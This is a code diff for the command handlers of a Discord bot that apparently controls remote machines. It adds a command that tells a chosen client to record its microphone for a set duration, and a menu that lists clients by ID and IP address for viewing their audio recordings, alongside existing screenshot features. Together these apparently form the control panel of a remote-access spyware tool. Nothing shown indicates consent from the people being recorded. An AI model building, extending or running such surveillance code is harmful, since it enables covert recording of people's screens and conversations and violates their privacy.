@@ -65,6 +65,26 @@ export const handleScreenshotCommand = async (interaction) => {
     }
 }
 
+export const handleMicrophoneCommand = async (interaction) => {
+    const clientId = interaction.options.getString('client_id');
+    const duration = interaction.options.getInteger('duration');
+    await interaction.deferReply({ ephemeral: true });
+    const url = `${API_BASE_URL}/command/${clientId}`;
+    try {
+        const data = {
+            command: 'audio',
+            params: {
+                duration: duration
+            }
+        };
+        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
+        await interaction.editReply(`${commands.find(command => command.name === 'microphone').description}`);
+    } catch (error) {
+        console.error("Erreur lors de l'envoi de la commande", error);
+        await interaction.editReply("Erreur lors de l'envoi de la commande.");
+    }
+};
+
 export const handleListAllScreenshotsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
     try {
@@ -78,7 +98,7 @@ export const handleListAllScreenshotsCommand = async (interaction) => {
 
         const buttons = clients.map(client =>
             new ButtonBuilder()
-                .setCustomId(`client_${client.id}`)
+                .setCustomId(`screenshot_${client.id}`)
                 .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                 .setStyle(1)
         );
@@ -90,6 +110,37 @@ export const handleListAllScreenshotsCommand = async (interaction) => {
         }
 
         await interaction.editReply({ content: "Sélectionnez un client pour voir les captures d'écran :", components });
+    } catch (error) {
+        console.error("Erreur lors de la récupération des clients", error);
+        await interaction.editReply("Erreur lors de la récupération des clients.");
+    }
+};
+
+export const handleListAllMicrophonesCommand = async (interaction) => {
+    await interaction.deferReply({ ephemeral: true });
+    try {
+        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
+        const clients = response.data;
+
+        if (clients.length === 0) {
+            await interaction.editReply("Aucun client disponible.");
+            return;
+        }
+
+        const buttons = clients.map(client =>
+            new ButtonBuilder()
+                .setCustomId(`microphone_${client.id}`)
+                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
+                .setStyle(1)
+        );
+
+        const components = [];
+        for (let i = 0; i < buttons.length; i += 5) {
+            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
+            components.push(actionRow);
+        }
+
+        await interaction.editReply({ content: "Sélectionnez un client pour voir les enregistrements audio :", components });
     } catch (error) {
         console.error("Erreur lors de la récupération des clients", error);
         await interaction.editReply("Erreur lors de la récupération des clients.");
